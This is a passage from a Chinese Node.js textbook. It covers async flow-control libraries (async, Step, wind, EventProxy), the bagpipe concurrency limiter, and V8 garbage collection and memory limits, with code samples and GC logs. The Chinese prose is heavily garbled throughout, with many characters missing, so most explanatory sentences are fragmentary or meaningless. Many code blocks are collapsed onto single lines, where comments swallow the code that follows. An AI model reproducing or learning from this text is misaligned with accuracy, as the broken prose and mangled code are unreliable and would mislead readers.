   }); }, function (arg1, callback) {
   // arg1 => file2.txt fs.readFile(arg1, 'utf-8', function (err, content) { callback(err, content);
   }); }, function(arg1, callback){
   // arg1 => file3.txt fs.readFile(arg1, 'utf-8', function (err, content) { callback(err, content); }); } ], function (err, result) { // result => file4.txt });
   这于下
   fs.readFile('file1.txt', 'utf-8', function (err, data1) { if (err) {
   return callback(err); } fs.readFile(data1, 'utf-8', function (err, data2) {
   if (err) {
   return callback(err); } fs.readFile(data2, 'utf-8', function (err, data3) {
   if (err) {
   return callback(err); } callback(null, data3);
   }); }); });
   .
   在实的务环境中，有很多复杂的关系，这些务是，是。这杂的编程环境经人于不序的情。为，async 了一个强大的 auto()实复杂务。
   我们的务场景下
   (1) 从读。
   (2) 接 MongoDB。
   (3) 接 Redis。
   (4) 编。
   (5) 上到 CDN。
   (6) 动服务。一下上务

{ readConfig: function () {}, connectMongoDB: function () {}, connectRedis: function () {}, complieAsserts: function () {}, uploadAsserts: function () {}, startup: function () {}
}
接下分一下关系。可以，connectMongoDB connectRedis readConfig，uploadAssertscomplieAsserts，startup 有。关系下
var deps = {
readConfig: function (callback) { // read config file callback();
},
connectMongoDB: ['readConfig', function (callback) { // connect to mongodb callback();
}],
connectRedis: ['readConfig', function (callback) { // connect to redis callback();
}],
complieAsserts: function (callback) { // complie asserts callback();
},
uploadAsserts: ['complieAsserts', function (callback) { // upload to assert callback();
}], startup: ['connectMongoDB', 'connectRedis', 'uploadAsserts', function (callback) { // startup }] };
auto()能关系自动分，以最的序以上务
async.auto(deps);
到 EventProxy 的实，要的事分，相关下
proxy.assp('readtheconfig', function () { // read config file proxy.emit('readConfig');
}).on('readConfig', function () { // connect to mongodb proxy.emit('connectMongoDB');
}).on('readConfig', function () { // connect to redis proxy.emit('connectRedis');
}).assp('complietheasserts', function () { // complie asserts proxy.emit('complieAsserts');
}).on('complieAsserts', function () { // upload to assert proxy.emit('uploadAsserts');
}).all('connectMongoDB', 'connectRedis', 'uploadAsserts', function () { // Startup });
.
本要 async 的几用。外，async 还了 forEach、mapECMAScript5 中数组的，多可关https://github.com/caolan/async。

3. Step
   一个的程是 TimCaswell 的 Step，它 async 量，在 API 的上也一性，因为它只有一个接 Step。过 npm install step 可使用。下
   Step(task1, task2, task3);
   Step 接数量的务，有的务都会次。下的次读
   Step( function readFile1() { fs.readFile('file1.txt', 'utf-8', this); },
   function readFile2(err, content) {
   fs.readFile('file2.txt', 'utf-8', this); }, function done(err, content) {
   console.log(content); } );
   可以到，Step 与前的事、Promise 甚至 async 都不的一在于 Step 用到了 this 关。事实上，它是 Step 内部的一个 next()，用的下一个务作为数，并用。
   .
   ，Step 实多个务并 this 有一个 parallel()，它 Step，要有务时才下一个务，相关下
   Step(
   function readFile1() { fs.readFile('file1.txt', 'utf-8', this.parallel()); fs.readFile('file2.txt', 'utf-8', this.parallel());
   },
   function done(err, content1, content2) { // content1 => file1 // content2 => file2 console.log(arguments);
   } );
   使用 parallel()的时候要小心的是，的的是多个数，Step 只会前个数，相关下
   var asyncCall = function (callback) { process.nextTick(function () { callback(null, 'result1', 'result2'); }); };
   在用 parallel()时，result2 会。
   Step 的 parallel()的是次时内部的数加 1，后一个数，这个数在用时才。数时，数 1。数为 0 的时候，Step 有用了，Step 会下一个。
   Step 与 async 相的是，一有一个产生，这个会作为下一个的一个数入。
   .
   Step 的外一个是 group()，它于 parallel()的，是在上有不。下的用于读一个目，后中的作
   Step( function readDir() {
   fs.readdir(**dirname, this); }, function readFiles(err, results) {
   if (err) throw err; // Create a new group var group = this.group(); results.forEach(function (filename) {
   if (/\.js\$/.test(filename)) { fs.readFile(**dirname + "/" + filename, 'utf8', group()); }
   }); }, function showAll(err, files) {
   if (err) throw err; console.dir(files); }
   ); 4 我们到有次 group()的用。一次用是 Step 要并，次用的会生一个数，数接的会组。parallel()下一个务的是下
   function (err, result1, result2, ...);
   group()的是
   function (err, results);
   这个数的数在数组中。
4. wind
   这还要一不的编程 wind（https://github.com/JeffreyZhao/wind）。它的前为Jscex，由国内开发。它为JavaScript语言了一个monadic，能高一些场景下的编程。
   编程有时要的场景，下我们由一个序了解 wind 的之
   var compare = function (x, y) { return x - y; };
   var swap = function (a, i, j) { var t = a[i]; a[i] = a[j]; a[j] = t; };
   var bubbleSort = function (array) { for (var i = 0; i < array.length; i++) { for (var j = 0; j < array.length -i - 1; j++) { if (compare(array[j], array[j + 1]) > 0) { swap(array, j, j + 1); } } } };
   在我们要加的是，这个序动起。这着在 swap()中要加动
   ，这在 JavaScript 中并不是一事，的在于动要时的。在 JavaScript 中只有 setTimeout()能实时能（用 while 时的不可，这在前有）。我们，setTimeout()是一个，在后，立。以，在
   动时序的序的继续会动多动。因，的动以实，wind 在解决这个问题上了它的之，相
   关下
   var compare = function (x, y) { return x - y; };
   var swapAsync = eval(Wind.compile("async", function (a, i, j) { $await(Wind.Async.sleep(20)); // 20var t = a[i]; a[i] = a[j]; a[j] = t; paint(a); //重数组
})); 
var bubbleSort = eval(Wind.compile("async", function (array) { for (var i = 0; i < array.length; i++) {  for (var j = 0; j < array.length -i - 1; j++) { if (compare(array[j], array[j + 1]) > 0) { $await(swapAsync(array, j, j + 1)); } } } }));
   上实了 20、动、继续序的。从的，这-入了，是并没有他程样，并没有因为分。时可以到，我们的中入了一些新的
   . eval(Wind.compile("async", function() {}));
   . \$await(); . Wind.Async.sleep(20);

下我们以上 3 的之。
定
eval()数在一是一个要对的数，Douglas Crockford 是深绝为，因为它能问上下编，可能上下。大多数用 eval()数的人都不能好它的用，DouglasCrockford 认为它是 JavaScript 可有可的能。
是在 wind 的，好反 Douglas Crockford 之之，用了 eval()问上下
的性。Wind.compile()会的数编，后 eval()。言之，eval(Wind.compile("async", function () {}));定了务。Wind.Async.sleep();内了对 setTimeout()的。
. $await()在定后，wind了$await()实。事实上，它并不是一个，也不在于上下中，只是一个的，之编这要。
$await()接的数是一个务对，务后才会后续作。一个作都可以为一个务，wind是于务实的。下的用于fs.readFile()用为一个务
var Wind = require("wind"); var Task = Wind.Async.Task; 
var readFileAsync = function (file, encoding) { return Task.create(function (t) {  fs.readFile(file, encoding, function (err, file) { if (err) { t.complete("failure", err); } else { t.complete("success", file); }  }); }); }; 
了过eval(Wind.compile("async", function () {}));定务外，的务创为Task.create()。readFileAsync()数到的务。在时，可以过complete()failuresuccess信，务。是failure可以过try/catch。这有些前try/catch数中的定。下的为用readFileAsync()到一个务的
var task = readFileAsync('file1.txt', 'utf-8'); 
下我们async者Step的一样，试一下wind的
var serial = eval(Wind.compile("async", function () { var file1 = $await(readFileAsync('file1.txt', 'utf-8')); console.log(file1); var file2 = $await(readFileAsync('file2.txt', 'utf-8')); console.log(file2); try { 
 var file3 = $await(readFileAsync('file3.txt', 'utf-8')); } catch (err) { console.log(err); } }));
serial().start();
上，到下
file1
file2 { [Error: ENOENT, open 'file3.txt'] errno: 34, code: 'ENOENT', path: 'file3.txt' }
在 JavaScript 中会立，在 wind 中做到了不 CPU 的目的。接下我们试下并的，相关下
var parallel = eval(Wind.compile("async", function () {
var result = $await(Task.whenAll({  file1: readFileAsync('file1.txt', 'utf-8'),  file2: readFileAsync('file2.txt', 'utf-8') 
})); console.log(result.file1); console.log(result.file2); 
})); 
parallel().start(); 
到
file1 file2 
wind了whenAll()并发，过$await 关的有务后才下继续。
换数
可以到，了 eval(Wind.compile("async", function () {}))在实中外，用在上已经与用相几。这分从已有的用编写的 Node，可以写的开。
Promise/Deferred 可以编程，这编程的要我们外者前的事情是务。这务的过程可以作是 Promise/Deferred 的。个都 readFileAsync 一定，会是一个大的工作量。wind 了个
. Wind.Async.Binding.fromCallback
. Wind.Async.Binding.fromStandard

在 Node 中的有，一是的用，只有一个数，下
fs.exists("/etc/passwd", function (exists) { // exists 数表是否存在});
fromCallback 用于这用为 wind 中的务。一是的用，数的一个数作为，下
fs.readFile('file1.txt', function (err, data) { // err 表异常});
fromStandard 用于这用到 wind 中的务。是，readFileAsync 的定实只要一可实
var readFileAsync = Wind.Async.Binding.fromStandard(fs.readFile);

5.

从本书的个程，从解决到解决作的有多，几个几。编程相对复杂，并事，相的问题过技能复杂的事情。
这对下几的区事发/阅相对是一为始的，Promise/Deferred 贡献了一个不的务的。上的这些程与 Promise/Deferred 的不，Promise/Deferred 的在于的用部分，程没有，在数的入上。从自由上，async、Step 这要相对灵活多。EventProxy 要事发/阅程过高数生数的实。
了 async、Step、EventProxy、wind 外，还有一过源编的实程的，streamline 是的。这并不在本的内，读者有，可以自阅相关。

## 4.4 异步并发控制

在续的编程，解决的问题外的性能优势，编程，是这有一个过不的。
在 Node 中，我们可以分用发起并用。使用下的，我们可以发起 100 次用
for (var i = 0, i < 100; i++){
async();
}
是并发量过大，我们的下服务会不。是对系统大量并发用，作系统的数量会用，下
Error: EMFILE, too many open files
可以，I/O 与 I/O 的 I/O 因为个 I/O 都是的，在环中，是一个接着一个用，不会用多的情，时性能也是下的对于 I/O，并发实，是由于实，要。言之，管是要系统的性能，还是要一定的过，以过不。
4.4.1bagpipe
对有的 API 加过，我们的不是动 API。实我写的 bagpipe 的解决是这样的。
过一个并发量。
前活跃（用发起）的用量小于定，从中。
活跃用到定，用时在中。个用时，从中新的用。bagpipe 的 API 要了一个 push()full 事，下

var Bagpipe = require('bagpipe'); //设定发数为 10 var bagpipe = new Bagpipe(10); for (var i = 0; i < 100; i++){
bagpipe.push(async, function () { //异步回调执行
}); } bagpipe.on('full', function (length) {
console.warn('系统处理不能时成队列目前队列长为:' + length); });
这的实于前的 smooth()。push()是过数的实，
一个数是，最后一个数是数，余为他数，心实下
/\*\* \*入方法数数为回调函数

-

@param {Function} method 异步方法

-

@param {Mix} args 数列表数为回调函数 \*/

Bagpipe.prototype.push = function (method) { var args = [].slice.call(arguments, 1); var callback = args[args.length -1]; if (typeof callback !== 'function') {
args.push(function () {}); } if (this.options.disabled || this.limit < 1) {
method.apply(null, args); return this; }
// 队列长过限制时 if (this.queue.length < this.queueLength || !this.options.refuse) {
this.queue.push({ method: method, args: args
});
} else { var err = new Error('Too much async call in queue'); err.name = 'TooMuchAsyncCallError'; callback(err);
}
if (this.queue.length > 1) { this.emit('full', this.queue.length); }
this.next(); return this; };
用推入后，用一次 next()试触发。next()的定下
/*! *续执行队列中的续动作 _/
Bagpipe.prototype.next = function () { var that = this; if (that.active < that.limit && that.queue.length) {
var req = that.queue.shift(); that.run(req.method, req.args); } };
next()要活跃用的数量，，用内部 run()的用。4 这为了数是否，用了一个入的技，下
/_! _执行队列中的方法 _/
Bagpipe.prototype.run = function (method, args) { var that = this; that.active++; var callback = args[args.length -1]; var timer = null; var called = false;
// inject logic
args[args.length -1] = function (err) { // anyway, clear the timer if (timer) {
clearTimeout(timer);
timer = null; } // if timeout, don't execute if (!called) {
that.\_next(); callback.apply(null, arguments);
} else { // pass the outdated error if (err) {
that.emit('outdated', err); } } };
var timeout = that.options.timeout; if (timeout) { timer = setTimeout(function () { // set called as true
called = true;
that.\_next();
// pass the exception
var err = new Error(timeout + 'ms timeout');
err.name = 'BagpipeTimeoutError';
err.data = {
name: method.name,
method: method.toString(),
args: args.slice(0, -1)
};
callback(err);
}, timeout);
}
method.apply(null, args);
};
用入的数前，过。这个的数内部的活跃的数 1 后，动用 next()后续的用。
bagpipe 于开了一，用并，是定上。仅仅在用 push()时分开，并不对有 API 有入。
式
事实上，bagpipe 还有一些深的使用。对于大量的用，也要分场景区分，因为并发，会部分用要。用有实时的，要，因为到时，可能已经过了时，使了数，也没有了。这场景下要，用，不用不要的时。bagpipe 为了绝。
绝的使用只要下数可，相关下
//设定发数为 10
var bagpipe = new Bagpipe(10, {
refuse: true
});
在绝下，的用也了之后，新的用就接它一个的绝。
.
的要因是用时，用产生的高于的。为了些用使用了多的时，我们要一个时线，些时的用活跃，中的用。否在绝下，会有多的用因为个，到绝。相对言，这场景下到绝。为了对在实时场景下的个用，要个用的时，些之。
为，bagpipe 也了时。时是为用一个时，用没有在定时内，我们用入的数，用到一个时，以。后下一个中的用。时的下
//设定发数为 10 var bagpipe = new Bagpipe(10, { timeout: 3000 });
.
用的并发在不场景下的不实时场景下，的并发时已经可以在实时场景下，要、的。
4.4.2async
有，async 也了一个用于用的 parallelLimit()。下是 async 的
async.parallelLimit([ function (callback) {
fs.readFile('file1.txt', 'utf-8', callback); }, function (callback) {
fs.readFile('file2.txt', 'utf-8', callback); } ], 1, function (err, results) { // TODO });
parallelLimit()与 parallel()，多了一个用于并发数量的数，使务只能时并发一定数量，不是并发。parallelLimit()的在于动加并务。为，async 了 queue()，这对于遍目作分有。以下是 queue()的
var q = async.queue(function (file, callback) {
fs.readFile(file, 'utf-8', callback); }, 2); q.drain = function () {
// 成队列中的有务}; fs.readdirSync('.').forEach(function (file) {
q.push(file, function (err, data) { // TODO }); });
管 queue()实了动加并务，是相 parallelLimit()，由于 queue()接收的数是定的，它了 parallelLimit()的多样性，我心认为 bagpipe 灵活，可以加的务，也可以动加务，时还能在实时场景中加入绝时
。在实应用中，开发者可以场景。

## 4.5 总结

在接触 Node 的过程中，很多人接触了几个数之后就了。管编程，是并一是，一习，就自。从社区过的经言，JavaScript 编程的题已经本解决，是过事，还是过 Promise/Deferred，者程。相信在以上技之后，编程不是事，习编程之后，会收多享的编程。
本要了的几编程解决，这是目前 JavaScript 中要使用的。对于他语言言，还有程（coroutine）。是由于 Node 于 V8 的因，在目前 EMCAScript5 的实下还不程。这些还在定中，以时不作。的 V8Generator，也在 Node 中能接使用。
最后，因为人们是习性以线性的，以编程相对为以。这个以的本质是不会因为大线性的性。就像月不会因为你的心情自有的。

## 4.6 参考资源

本章参考的资源如下：

- http://nodejs.org/docs/latest/api/events.html
- https://github.com/JacksonTian/eventproxy/blob/master/README.md
- https://github.com/JeffreyZhao/jscex/blob/master/README-cn.md
- http://documentup.com/kriskowal/q/
- http://gearman.org/
- https://github.com/JacksonTian/bagpipe
- http://www.jslint.com/lint.html
- https://github.com/JeffreyZhao/wind
- http://wiki.commonjs.org/wiki/Promises

# 第 5 章 内存控制

也读者会好为会有这样一在于本书中，因为在过很一时内，JavaScript 开发者很在开发过程中到要对内的场景，也的。到内，大想起的也只是本的 IE 中 JavaScript 与 DOM 时发生的问题。页的内用过多，本不到收，用已经不新了前页。
着 Node 的发，JavaScript 已经实了 CommonJS 的生大一统的想，JavaScript 的应用场景已不在中。本时开些时的场景，网页应用、工，这场景由于时，且在用的机上，使内使用过多内，也只会到端用。由于时，着程的，内会，几没有内管的要。着 Node 在服务端的广应用，他语言在着的问题在 JavaScript 中也了。
于、事驱动立的 Node 服务，有内的优，海量的网请。在海量请的前下，开发者就要一些不会的问题。本书写到这是服务端编程的了，内是在海量请时的前下探的。在服务端，源就，要为海量用服务，就使一源都要高环用。在 3 中，不多已 Node 是用 CPUI/O 这个服务源，本在 Node 中高使用内。

## 5.1 V8 的垃圾回收机制与内存限制

我们在学习 JavaScript 编程时过，它与 Java 一样，由收机自动内管，这使开发者不要像 C/C++程序样在编写的过程中时关内的分问题。在中开发时，几很有人能到收对应用程序性能的情。Node 极大了 JavaScript 的应用场景，应用场景从客端到服务端之后，我们就能发，对于性能的服务端程序，内管的好、收是否优，都会对服务。在 Node 中，这一都与 Node 的 JavaScriptV8 相关。
5.1.1Node V8
可以发，Node 在发程中不开 V8，以在的页中就到 Node 是一个在 Chrome 的 JavaScript 时上的。2009 年，Node 的创始人 Ryan Dahl 了 V8 作为 Node 的 JavaScript 脚本，这不开时起的次大。次大中，自 Google 的 Chrome 以优的性能为。Chrome 的后不开 JavaScriptV8。V8 后，JavaScript 一它作为脚本语言性能下的。在接下的性能分中，V8 续至今。V8 的性能优势使用 JavaScript 写高性能后服务程序为可能。在这样的机下，Ryan Dahl 了 JavaScript，了 V8，在事驱动、I/O 的下实了 Node。
关于 V8，它的与景是大有。作为机，V8 的性能优，这与它的-者有大的源，Chrome 的也不开它后的天才——LarsBak。在 Lars 的工作，绝大部分都是与机相关的工作。在开发 V8 之前，他经在 Sun 工作，HotSpot 的技术，要于开发高性能的 Java 机。在这之前，他也为 Self、Smalltalk 语言开发过高性能机。这些与的经 V8 一就了时有的 JavaScript 机。
Node 在 JavaScript 的上接于 V8，可以着 V8 的就能享到好的性能新的语言性（ES5ES6），时也到 V8 的一些，是本要的内。
5.1.2V8
在一的后端开发语言中，在本的内使用上没有，在 Node 中过 JavaScript 使用内时就会发只能使用部分内（64 系统下为 1.4GB，32 系统下为 0.7 GB）。在这样的下，会 Node 接作大内对，一个 2 GB 的读入内中分，使内有 32GB。这样在个 Node 程的情下，机的内源到的使用。
这个问题的要因在于 Node 于 V8，以在 Node 中使用的 JavaScript 对本上都是过 V8 自己的分管的。V8 的这内管机在的应用场景下使用起有余，以前端页中的有。在 Node 中，这了开发者心使用大内的想。
管在服务端作大内也不是的场景，有了之后，我们的为就着，在实的应用中不小心触到这个，会程。要 V8 为
了内的用量，要到 V8 在内使用上的。后，才能问题并好内管。
5.1.3V8
在 V8 中，有的 JavaScript 对都是过分的。Node 了 V8 中内使用量的，下的，到的内信
\$ node > process.memoryUsage(); { rss: 14958592,
heapTotal: 7195904, heapUsed: 2821496 }
在上中，在 memoryUsage()的 3 个性中，heapTotalheapUsed 是 V8 的内使用情，前者是已请到的内，后者是前使用的量。至于 rss 为，我们在后续的内中会到。图 5-1 为 V8 的图

图 5-1 V8 的图
我们在中量并时，使用对的内就分在中。已请的内不分新的对，继续请内，到的大小过 V8 的为。
至于 V8 为要的大小，因为 V8 最初为，不可能到用大量内的场景。对于网页，V8 的已经有余。深因是 V8 的收机的。的，以 1.5GB 的收内为，V8 做一次小的收要 50 以上，做一次量的收甚至要 1 以上。这是收中起 JavaScript 线程的时，在这样的时下，应用的性能应能都会线下。这样的情不仅仅后端服务接，前端也接。因，在时的下接内是一个好的。
，这个也不是不能开，V8 了我们使用多的内。Node 在动时可以--max-old-space-size--max-new-space-size 内的大小，下
node --max-old-space-size=1700 test.js //单位为 MB //者 node --max-new-space-size=1024 test.js //单位为 KB
上数在 V8 初始时生，一生就不能动。到 Node 分内 JavaScript 对的情，可以用这个办 V8 认的内，在过程中多用了一些内就。
接下，我们深入了解 V8 在收的。在的前下，着的并不一定就。
5.1.4V8
在开 V8 的收机前，有要下 V8 用到的收。

1. V8
   V8 的收要于分收机。在自动收的过程中，人们发没有一收能有的场景。因为在实的应用中，对的生不一，不的只能对定情有最好的。为，统学在收的发中产生了大的作用，的收中对的活时内的收不的分，后分对不分的内以高的。
   . V8 的
   在 V8 中，要内分为新生生。新生中的对为活时的对，生中的对为活时内的对。图 5-2 为 V8 的分图。

图 5-2 V8 的分图
V8 的大小就是新生用内加上生的内。前我们的--max-old-space-size 数可以用于生内的最大，--max-new-space-size 数用于新生内的大小的。的是，这个最大要在动时就定。这着 V8 使用的内没有办使用情自动，内分过程中过极时，就会起程。
前到过，在认下，一分内，在 64 系统 32 系统下会分只能使用 1.4GB0.7 GB 的大小。这个可以从 V8 的源中到。在下的中，Page::kPageSize 的为 1MB。可以到，生的在 64 系统下为 1400 MB，在 32 系统下为 700 MB
// semispace*size* should be a power of 2 and old*generation_size* should be // a multiple of Page::kPageSize #if defined(V8*TARGET_ARCH_X64) #define LUMP_OF_MEMORY (2 \* MB)
code_range_size*(512*MB), #else #define LUMP*OF*MEMORY MB
code_range_size*(0), #endif #if defined(ANDROID)
reserved*semispace_size*(4 * Max(LUMP*OF*MEMORY, Page::kPageSize)), max_semispace_size*(4 * Max(LUMP*OF*MEMORY, Page::kPageSize)), initial_semispace_size*(Page::kPageSize), max*old_generation_size*(192*MB), max*executable_size*(max*old_generation_size*),
#else reserved*semispace_size*(8 * Max(LUMP*OF_MEMORY, Page::kPageSize)), max_semispace_size*(8 * Max(LUMP*OF_MEMORY, Page::kPageSize)), initial_semispace_size*(Page::kPageSize), max*old_generation_size*(700ul * LUMP*OF_MEMORY), max_executable_size*(256l \_ LUMP*OF_MEMORY),
#endif
对于新生内，它由个 reserved_semispace_size*，后因。机
数不，reserved*semispace_size*在 64 系统 32 系统上分为 16 MB8 MB。以新生
内的最大在 64 系统 32 系统上分为 32 MB16 MB。
V8 内的最大可以从下的中，为 4 \_ reserved*semispace* size* + max_old_generation_size*
// Returns the maximum amount of memory reserved for the heap. For
// the young generation, we reserve 4 times the amount needed for a
// semi space. The young generation consists of two semi spaces and
// we reserve twice the amount needed for those in order to ensure
// that new space can be aligned to its size
intptr*t MaxReserved() {
return 4 * reserved*semispace_size* + max*old_generation_size*;
}
因，认情下，V8 内的最大在 64 系统上为 1464 MB，32 系统上为 732 MB。这个数可以解为在 64 系统下只能使用 1.4 GB 内在 32 系统下只能使用 0.7 GB 内。
. Scavenge 在分的上，新生中的对要过 Scavenge 收。在 Scavenge 的实中，要用了 Cheney，由 C.J.Cheney 于 1970 年次发在 ACM 上。
Cheney 是一用复的实的收。它内一分为，一部分为 semispace。在这个 semispace 中，只有一个于使用中，一个于。于使用的 semispace 为 From，于的为 To。我们分对时，是在 From 中分。开始收时，会 From 中的活对，这些活对复到 To 中，活对用的会。复后，FromTo 的发生对。言之，在收的过程中，就是过活对在个 semispace 之复。
Scavenge 的是只能使用内中的一，这是由分复机决定的。Scavenge 由于只复活的对，并且对于生的场景活对只部分，以它在时上有优的。
由于 Scavenge 是的时的，以大应用到有的收中。可以发，Scavenge 应用在新生中，因为新生中对的生，这个。
是，V8 的内图应图 5-3。

图 5-3 V8 的内图
实使用的内是新生中的个 semispace 大小生用内大小之。一个对经过多次复活时，它会认为是生的对。这生的对后会动到生中，用新的管。对从新生中动到生中的过程为。
在的 Scavenge 过程中，From 中的活对会复到 To 中，后对 FromTo 对（）。在分收的前下，From 中的活对在复到 To 之前要。在一定下，要活的对动到生中，也就是对。
对的要有个，一个是对是否经过 Scavenge 收，一个是 To 的内用过。
在认情下，V8 的对分要中在 From 中。对从 From 中复到 To 时，会它的内这个对是否已经经过一次 Scavenge 收。已经经过了，会对从 From 复到生中，没有，复到 To 中。这个程图 5-4。

图 5-4 程
一个是 To 的内用。要从 From 复一个对到 To 时，To 已经使用了过 25%，这个对接到生中，这个的图图 5-5。

图 5-5 的图
25%这个的因是这次 Scavenge 收后，这个 ToFrom，接下的内分在这个中。过高，会后续的内分。
对后，会在生中作为活的对对，接新的收。
. Mark-Sweep &Mark-Compact
对于生中的对，由于活对大，用 Scavenge 的会有个问题一个是活对多，复活对的会很一个问题是一的问题。这个问题应对生的对时 Scavenge 会。为，V8 在生中要用了 Mark-SweepMark-Compact 相的收。
Mark-Sweep 是的，它分为个。与 Scavenge 相，Mark-Sweep 并不内分为，以不在一的为。与 Scavenge 复活着的对不，Mark-Sweep 在遍中的有对，并活着的对，在后的中，只没有的对。可以，Scavenge 中只复活着的对，Mark-Sweep 只对。活对在新生中只小部分，对在生中只小部分，这是收能高的因。图 5-6 为 Mark-Sweep 在生中后的图，部分为的对。

图 5-6 Mark-Sweep 在生中后的图 
Mark-Sweep 最大的问题是在一次收后，内会不续的。这内会对后续的内分问题，因为很可能要分一个大对的情，这时有的都次分，就会前触发收，这次收是不要的。
为了解决 Mark-Sweep 的内问题，Mark-Compact。Mark-Compact 是的，是在 Mark-Sweep 的上的。它们的在于对在为后，在的过程中，活着的对一端动，动后，接外的内。图 5-7 为 Mark-Compact 并动活对后的图，为活对，深为对，为活对动后下的。

图 5-7 Mark-Compact 并动活对后的图
动后，就可以接最的活对后的内区收。
这 Mark-SweepMark-Compact 着不仅仅是因为是关系，在 V8 的收中者是使用的。5-1 是目前到的 3 要收的对。
5-13
Mark-Sweep Mark-Compact Scavenge  
 中 最 最
开 （有） （） （）
是否动对 否 是 是

从 5-1 中可以到，在 Mark-SweepMark-Compact 之，由于 Mark-Compact 要动对，以它的不可能很，以在上，V8 要使用 Mark-Sweep，在不以对从新生中过的对分时才使用 Mark-Compact。
. Incremental Marking
为了 JavaScript 应用与收到的不一的情，收的 3 本都要应用下，收后复应用，这为为（stop-the-world）。在 V8 的分收中，一次小收只收新生，由于新生认小，且中活对，以它是的也不大。V8 的生大，且活对多，收（full 收）的、、动作的就会可，要。
为了收的时，V8 从入，本要一的动作为量（incrementalmarking），也就是分为多小，做一就 JavaScript 应用一小会，收与应用到。图 5-8 为量图。

图 5-8 量图
V8 在经过量的后，收的最大时可以到本的 1/6。
V8 后续还入了（lazy sweeping）与量（incremental compaction），与动作也量的。时还入并与并，一用多性能次的时。于有，不深入解了。

2.

从 V8 的自动收机的可以到，V8 对内使用的由。新生为一个小的内是的，生过大对于收并。V8 对内的对于 Chrome 这个页使用一个 V8 实言，内的使用是有余了。对于 Node 编写的服务端，内也并不场景下的使用。是对于 V8 的收 JavaScript 在线程上的情，收是性能的因之一。想要高性能的，要收量，是收。
以 Web 服务中的会实为，一过内，在问量大的时候会生中的活对，不仅/过程时，还会内，甚至（情可 8）。
5.1.5
收的要是在动时加--trace_gc 数。在收时，会从
中收的信。下是一，后，会在 gc.log 中到有收信
node --trace_gc -e "var a = [];for (var i = 0; i < 1000000; i++) a.push(new Array(100));" > gc.log
下是我的收中的部分要内
[2489] 19 ms: Scavenge 1.9 (34.0) -> 1.8 (35.0) MB, 1 ms [Runtime::PerformGC]. ... [2489] 36 ms:Mark-sweep9.1(40.0) ->9.0(44.0)MB,10 ms[Runtime::PerformGC][promotionlimit reached]. ... [2489] Limited new space size due to high promotion rate: 1 MB ... [2489] Increasing marking speed to 3 due to high promotion rate ... [2489] 107 ms: Mark-sweep 38.4 (73.0) -> 38.0 (74.0) MB, 3 ms (+ 23 ms in 63 steps since start of marking, biggest step 0.284180 ms) [Runtime::PerformGC][promotion limit reached]. ... [2489] 188 ms: Mark-sweep 63.8 (100.0) -> 63.4 (100.0) MB, 45 ms [Runtime::PerformGC][gc in old space requested]. ... [2489] 395 ms: Scavenge 182.9 (220.3) -> 182.9(221.3)MB,1 ms(+2ms in7stepssince last GC) [Runtime::PerformGC][incremental marking delaying mark-sweep]. ...
过分收，可以了解收的，收的些时，触发的因是。
过在 Node 动时使用--prof 数，可以到 V8 时的性能分数，中包了收时用的时。下的不创对并分部量 a，这以下为 test01.js
for (var i = 0; i < 1000000; i++) { var a = {}; }
后以下
$ node --prof test01.js 
这会在目下到一个v8.log。本不可读性，内大下
code-creation,LazyCompile,0x1dd61958ec00,396," /Users/jacksontian/git/diveintonode/examples/05/test01.js:1",0x38c53b008370,~ tick,0x10031daaa,0x7fff5fbfe4c0,0,0x34bb,2,0x1dd61958eb3e,0x1dd6195688bf,0x1dd6195689e5,0x1dd61956 7599,0x1dd619566efc,0x1dd619568e4b,0x1dd61952e78a code-creation,LazyCompile,0x1dd61958eda0,532," /Users/jacksontian/git/diveintonode/examples/05/test01.js:1",0x38c53b008370,* tick,0x1dd61958eecd,0x7fff5fbff3b8,0,0x16e3f,0,0x1dd6195688bf,0x1dd6195689e5,0x1dd619567599,0x1dd6 19566efc,0x1dd619568e4b,0x1dd61952e78a tick,0x1dd61958ee55,0x7fff5fbff3b8,0,0x5082a,0,0x1dd6195688bf,0x1dd6195689e5,0x1dd619567599,0x1dd6 19566efc,0x1dd619568e4b,0x1dd61952e78a tick,0x1dd61958ee77,0x7fff5fbff3b8,0,0x8c593,0,0x1dd6195688bf,0x1dd6195689e5,0x1dd619567599,0x1dd6 19566efc,0x1dd619568e4b,0x1dd61952e78a tick,0x1dd61958ee71,0x7fff5fbff3b8,0,0xc8717,0,0x1dd6195688bf,0x1dd6195689e5,0x1dd619567599,0x1dd6 19566efc,0x1dd619568e4b,0x1dd61952e78a code-creation,StoreIC,0x1dd61958efc0,185,"loaded" 
，V8了linux-tick-processor工用于统信。工可以从Node源的
deps/v8/tools目下到，Windows下的对应为windows-tick-processor.bat。目
加到环境量PATH中，可接用
$ linux-tick-processor v8.log
下为我次的统
Statistical profiling result from v8.log, (37 ticks, 1 unaccounted, 0 excluded).
[Unknown]: ticks total nonlib name 1 2.7%
[Shared libraries]: ticks total nonlib name
28 75.7% 0.0% /usr/local/bin/node 2 5.4% 0.0% /usr/lib/system/libsystem_kernel.dylib 2 5.4% 0.0 % /usr/lib/system/libsystem_c.dylib
[JavaScript]: ticks total nonlib name
3 8.1 % 60.0% LazyCompile: \*<anonymous> /Users/jacksontian/git/diveintonode/examples/05/test01.js:1
1 2.7 % 20.0% Stub: FastCloneShallowObjectStub 1 2.7 % 20.0% Function: ~NativeModule.compile node.js:613
[C++]: ticks total nonlib name
[GC]: ticks total nonlib name 2 5.4%
[Bottom up (heavy) profile]: Note: percentage shows a share of a particular caller in the total amount of its parent calls. Callers occupying less than 2.0 % are not shown.
ticks parent name 28 75.7 % /usr/local/bin/node ...
统内多，中收部分下
[GC]: ticks total nonlib name 2 5.4%
由于不分对，收的时为 5.4%。，这着事环 1000 的过程中要 54 的时用于收。

## 5.2 高效使用内存

在 V8 前，开发者要的是收机高工作。
5.2.1
到触发收，一个要的是作用（scope）。在 JavaScript 中能作用的有数用、with 以作用。以下为
var foo = function () { var local = {}; };
foo()数在次用时会创对应的作用，数后，作用会。时作用中的部量分在作用上，作用的。只部量用的对活。在这个中，由于对小，会分在新生中的 From 中。在作用后，部量 local，用的对会在下次收时。
以上就是最本的内收过程。

1.

与作用相关的是识。识，可以解为量。在下的中，
bar()数时，会到 local 量
var bar = function () { console.log(local); };
JavaScript 在时会量定在。它最的是前作用，在前作用中到量的，会上的作用，到到为。

2.

在下的中
var foo = function () { var local = 'local var'; var bar = function () {
var local = 'another var'; var baz = function () {
console.log(local); }; baz();
};
bar(); }; foo();
local 量在 baz()数的作用不到，继在 bar()的作用。上 bar()中的 local，会继续上，一到作用。这样的使作用像一个。由于识的是上的，以量只能外问，不能内问。图 5-9 为量在作用中的图。

图 5-9 量在作用中的图
